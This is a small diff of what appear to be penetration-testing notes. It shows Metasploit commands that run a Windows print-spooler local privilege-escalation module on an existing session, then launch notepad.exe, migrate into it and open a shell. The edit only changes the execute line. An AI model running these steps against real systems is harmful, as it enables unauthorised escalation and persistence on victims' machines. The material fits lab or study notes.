@@ -195,7 +195,8 @@ use exploit/windows/local/print_spooler_dcerpc
 set SESSION 1
 exploit
 ---------
-execute -H -c -f "C:\\windows\\sysnative\\notepad.exe"
+
+execute -f "C:\\Windows\\Sysnative\\notepad.exe"
 migrate 7584
 shell
 ---------
